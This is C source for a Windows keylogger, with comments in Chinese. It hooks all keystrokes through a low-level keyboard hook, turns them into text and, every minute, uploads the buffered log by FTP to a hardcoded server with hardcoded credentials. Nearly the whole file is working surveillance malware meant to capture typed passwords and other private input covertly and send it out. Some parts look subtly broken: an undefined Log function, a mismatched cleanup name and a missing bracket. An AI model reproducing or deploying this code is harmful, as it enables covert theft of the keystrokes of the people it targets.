#include <stdio.h>
#include <string.h>
#include <Windows.h>
#include <WinInet.h>
#include <ShlObj.h>

#pragma comment(lib, "WININET")

#define DEBUG

#define NAME "G"

// FTP 设置
#define FTP_SERVER "127.0.0.1"
#define FTP_USERNAME "ghostwolflab"
#define FTP_PASSWORD "ghostwolflab"
#define FTP_LOG_PATH "G_Log.txt"

#define MAX_LOG_SIZE 4096
#define BUF_SIZ 1024
#define BUF_LEN 1
#define MAX_VALUE_NAME 16383

#define ONE_SECOND 1000
#define ONE_MINUTE ONE_SECOND * 60
#define TIMEOUT ONE_MINUTE * 1

// 全局句柄到挂钩
HHOOK ghHook = NULL;
// 互斥体的全局句柄
HANDLE ghMutex = NULL;

// 日志堆的全局句柄
HANDLE ghLogHeap = NULL;
// global string pointer to log buffer
LPSTR lpLogBuf = NULL;
// 日志缓冲区的当前最大大小
DWORD dwLogBufSize = 0;

// 临时缓冲区堆的全局句柄
HANDLE ghTempHeap = NULL;
// 临时缓冲区的全局句柄
LPSTR lpTempBuf = NULL;

// 多线程对象
HANDLE hTempBufHasData = NULL;
HANDLE hTempBufNoData = NULL;

// 回调函数
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;
        if (wParam == WM_KEYDOWN) {
            DWORD dwLogBufLen = strlen(lpLogBuf);

            CHAR key[2];
            DWORD vkCode = kbd->vkCode;
            // 按键 0 - 9
            if (vkCode >= 0x30 && vkCode <= 0x39) {
                // Shift+按键
                if (GetAsyncKeyState(VK_SHIFT)) {
                    switch (vkCode) {
                        case 0x30:
                            Log(")");
                            break;
                        case 0x31:
                            Log("!");
                            break;
                        case 0x32:
                            Log("@");
                            break;
                        case 0x33:
                            Log("#");
                            break;
                        case 0x34:
                            Log("$");
                            break;
                        case 0x35:
                            Log("%");
                            break;
                        case 0x36:
                            Log("^");
                            break;
                        case 0x37:
                            Log("&");
                            break;
                        case 0x38:
                            Log("*");
                            break;
                        case 0x39:
                            Log("(");
                            break;
                    }
                } else {
                    sprintf(key, "%c", vkCode);
                    Log(key);
                }
                // 按键 A - Z
            } else if (vkCode >= 0x41 && vkCode <= 0x5A) {
                //小写 a -z
                if (GetAsyncKeyState(VK_SHIFT) ^ ((GetKeyState(VK_CAPITAL) & 0x0001)) == FALSE)
                    vkCode += 32;
                sprintf(key, "%c", vkCode);
                Log(key);
            // 其它按键
            } else {
                switch (vkCode) {
                    case VK_CANCEL:
                        Log("[CANCEL]");
                        break;
                    case VK_BACK:
                        Log("[BACKSPACE]");
                        break;
                    case VK_TAB:
                        Log("[TAB]");
                        break;
                    case VK_CLEAR:
                        Log("[CLEAR]");
                        break;
                    case VK_RETURN:
                        Log("[ENTER]");
                        break;
                    case VK_CONTROL:
                        Log("[CTRL]");
                        break;
                    case VK_MENU:
                        Log("[ALT]");
                        break;
                    case VK_PAUSE:
                        Log("[PAUSE]");
                        break;
                    case VK_CAPITAL:
                        Log("[CAPS LOCK]");
                        break;
                    case VK_ESCAPE:
                        Log("[ESC]");
                        break;
                    case VK_SPACE:
                        Log("[SPACE]");
                        break;
                    case VK_PRIOR:
                        Log("[PAGE UP]");
                        break;
                    case VK_NEXT:
                        Log("[PAGE DOWN]");
                        break;
                    case VK_END:
                        Log("[END]");
                        break;
                    case VK_HOME:
                        Log("[HOME]");
                        break;
                    case VK_LEFT:
                        Log("[LEFT ARROW]");
                        break;
                    case VK_UP:
                        Log("[UP ARROW]");
                        break;
                    case VK_RIGHT:
                        Log("[RIGHT ARROW]");
                        break;
                    case VK_DOWN:
                        Log("[DOWN ARROW]");
                        break;
                    case VK_INSERT:
                        Log("[INS]");
                        break;
                    case VK_DELETE:
                        Log("[DEL]");
                        break;
                    case VK_NUMPAD0:
                        Log("[NUMPAD 0]");
                        break;
                    case VK_NUMPAD1:
                        Log("[NUMPAD 1]");
                        break;
                    case VK_NUMPAD2:
                        Log("[NUMPAD 2]");
                        break;
                    case VK_NUMPAD3:
                        Log("[NUMPAD 3");
                        break;
                    case VK_NUMPAD4:
                        Log("[NUMPAD 4]");
                        break;
                    case VK_NUMPAD5:
                        Log("[NUMPAD 5]");
                        break;
                    case VK_NUMPAD6:
                        Log("[NUMPAD 6]");
                        break;
                    case VK_NUMPAD7:
                        Log("[NUMPAD 7]");
                        break;
                    case VK_NUMPAD8:
                        Log("[NUMPAD 8]");
                        break;
                    case VK_NUMPAD9:
                        Log("[NUMPAD 9]");
                        break;
                    case VK_MULTIPLY:
                        Log("[*]");
                        break;
                    case VK_ADD:
                        Log("[+]");
                        break;
                    case VK_SUBTRACT:
                        Log("[-]");
                        break;
                    case VK_DECIMAL:
                        Log("[.]");
                        break;
                    case VK_DIVIDE:
                        Log("[/]");
                        break;
                    case VK_F1:
                        Log("[F1]");
                        break;
                    case VK_F2:
                        Log("[F2]");
                        break;
                    case VK_F3:
                        Log("[F3]");
                        break;
                    case VK_F4:
                        Log("[F4]");
                        break;
                    case VK_F5:
                        Log("[F5]");
                        break;
                    case VK_F6:
                        Log("[F6]");
                        break;
                    case VK_F7:
                        Log("[F7]");
                        break;
                    case VK_F8:
                        Log("[F8]");
                        break;
                    case VK_F9:
                        Log("[F9]");
                        break;
                    case VK_F10:
                        Log("[F10]");
                        break;
                    case VK_F11:
                        Log("[F11]");
                        break;
                    case VK_F12:
                        Log("[F12]");
                        break;
                    case VK_NUMLOCK:
                        Log("[NUM LOCK]");
                        break;
                    case VK_SCROLL:
                        Log("[SCROLL LOCK]");
                        break;
                    case VK_OEM_PLUS:
                        GetAsyncKeyState(VK_SHIFT) ? Log("+") : Log("=");
                        break;
                    case VK_OEM_COMMA:
                        GetAsyncKeyState(VK_SHIFT) ? Log("<") : Log(",");
                        break;
                    case VK_OEM_MINUS:
                        GetAsyncKeyState(VK_SHIFT) ? Log("_") : Log("-");
                        break;
                    case VK_OEM_PERIOD:
                        GetAsyncKeyState(VK_SHIFT) ? Log(">") : Log(".");
                        break;
                    case VK_OEM_1:
                        GetAsyncKeyState(VK_SHIFT) ? Log(":") : Log(";");
                        break;
                    case VK_OEM_2:
                        GetAsyncKeyState(VK_SHIFT) ? Log("?") : Log("/");
                        break;
                    case VK_OEM_3:
                        GetAsyncKeyState(VK_SHIFT) ? Log("~") : Log("`");
                        break;
                    case VK_OEM_4:
                        GetAsyncKeyState(VK_SHIFT) ? Log("{") : Log("[");
                        break;
                    case VK_OEM_5:
                        GetAsyncKeyState(VK_SHIFT) ? Log("|") : Log("\\");
                        break;
                    case VK_OEM_6:
                        GetAsyncKeyState(VK_SHIFT) ? Log("}") : Log("]");
                        break;
                    case VK_OEM_7:
                        GetAsyncKeyState(VK_SHIFT) ? Log("\"") : Log("'");
                        break;
                }
            }


            if (dwLogBufLen == MAX_LOG_SIZE - 1)
                WaitForSingleObject(hTempBufNoData, INFINITE);
            else
                if (WaitForSingleObject(hTempBufNoData, 0) == WAIT_TIMEOUT)
                    return CallNextHookEx(0, nCode, wParam, lParam);

            strcpy(lpTempBuf, lpLogBuf);
            // 重置事件
            ResetEvent(hTempBufNoData);
            // FTP上传信号
            SetEvent(hTempBufHasData);

            //重置日志缓冲区大小
            ZeroMemory(lpLogBuf, dwLogBufSize);
        }
    }

    return CallNextHookEx(0, nCode, wParam, lParam);
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPCSTR lpCmdLine, int nCmdShow) {
    // 创建互斥体
    ghMutex = CreateMutex(NULL, TRUE, NAME);
    if (ghMutex == NULL) {
        Fatal("create mutex");
    }
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        Fatal("mutex already exists");
        ExitProcess(1);
    }

    // 在退出时声明清理句柄
    atexit(cleanUp);

    // 创建并分配堆缓冲区
    ghLogHeap = HeapCreate(0, BUF_SIZ + 1, 0);
    if (ghLogHeap == NULL) {
        Fatal("heap create");
    }

    lpLogBuf = (LPSTR)HeapAlloc(ghLogHeap, HEAP_ZERO_MEMORY, BUF_SIZ + 1);
    if (lpLogBuf == NULL) {
        Fatal("heap alloc");
    }
    dwLogBufSize = BUF_SIZ + 1;

    ghTempHeap = HeapCreate(0, dwLogBufSize, 0);
    if (ghTempHeap == NULL) {
        Fatal("temp heap create");
    }

    lpTempBuf = (LPSTR)HeapAlloc(ghTempHeap, HEAP_ZERO_MEMORY, dwLogBufSize);
    if (lpTempBuf == NULL) {
        Fatal("temp heap alloc");
    }

    // 设置多线程
    hTempBufHasData = CreateEvent(NULL, TRUE, FALSE, NULL);
    hTempBufNoData = CreateEvent(NULL, TRUE, TRUE, NULL);

    // 创建将击键日志发送到FTP服务器的线程
    if (CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)FTPSend, NULL, 0, NULL) == NULL) {
        Fatal("create thread");
    }

    // 设置击键挂钩
    ghHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    if (ghHook == NULL) {
        Fatal("hook failed");
    }
    // 无线循环捕获击键记录
    MSG msg;
    while (GetMessage(&msg, 0, 0, 0) != 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);    
    }

    UnhookWindowsHookEx(ghHook);

    return 0;
}

// FTP传输
VOID FTPSend(VOID) {
    while (TRUE) {
        // 等待上传缓冲区有数据再发送信号
        Sleep(TIMEOUT);
        SetEvent(hTempBufNoData);
        WaitForSingleObject(hTempBufHasData, INFINITE);
        // 初始化FTP连接
        HINTERNET hINet = InternetOpen(NAME, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, INTERNET_FLAG_PASSIVE);
        if (hINet == NULL)
            continue;

        HINTERNET hFTP = InternetConnect(hINet, FTP_SERVER, INTERNET_DEFAULT_FTP_PORT, FTP_USERNAME, FTP_PASSWORD, INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, NULL);
        if (hFTP == NULL) {
            InternetCloseHandle(hINet);
            continue;
        }
        // 发送FTP附加命令,将数据附加到上传缓冲区
        HINTERNET hFTPFile;
        CHAR szTemp[256];
        sprintf(szTemp, "APPE %s", FTP_LOG_PATH);
        BOOL bSuccess = FtpCommand(hFTP, TRUE, FTP_TRANSFER_TYPE_ASCII, szTemp, 0, &hFTPFile);
        if (bSuccess == FALSE) {
            InternetCloseHandle(hFTP);
            InternetCloseHandle(hINet);
            continue;
        }
        // 将数据写入到远程文件
        DWORD dwWritten = 0;
        bSuccess = InternetWriteFile(hFTPFile, lpTempBuf, strlen(lpTempBuf), &dwWritten);
        if (bSuccess == FALSE) {
            InternetCloseHandle(hFTP);
            InternetCloseHandle(hINet);
            continue;
        }
        // 关闭连接并无限循环
        InternetCloseHandle(hFTPFile);
        InternetCloseHandle(hFTP);
        InternetCloseHandle(hINet);
        ResetEvent(hTempBufHasData);
        //如果加上SetEvent(hTempBufNoData);则会一直保持连接状态
    }

    ExitThread(0);
}

// 处理错误信息
VOID Fatal(LPCSTR s) {
#ifdef DEBUG
    CHAR err_buf[BUF_SIZ];

    sprintf(err_buf, "%s failed: %lu", s, GetLastError());
    MessageBox(NULL, err_buf, NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif

    ExitProcess(1);
}

// 退出后清理
VOID CleanUp(VOID) {
    if (lpLogBuf && ghLogHeap) {
        HeapFree(ghLogHeap, 0, lpLogBuf);
        HeapDestroy(ghLogHeap);
    }
    if (ghHook) UnhookWindowsHookEx(ghHook);
    if (ghMutex) CloseHandle(ghMutex);
    if (lpTempBuf && ghTempHeap) {
        HeapFree(ghTempHeap, 0, lpTempBuf);
        HeapDestroy(ghTempHeap);
    }
}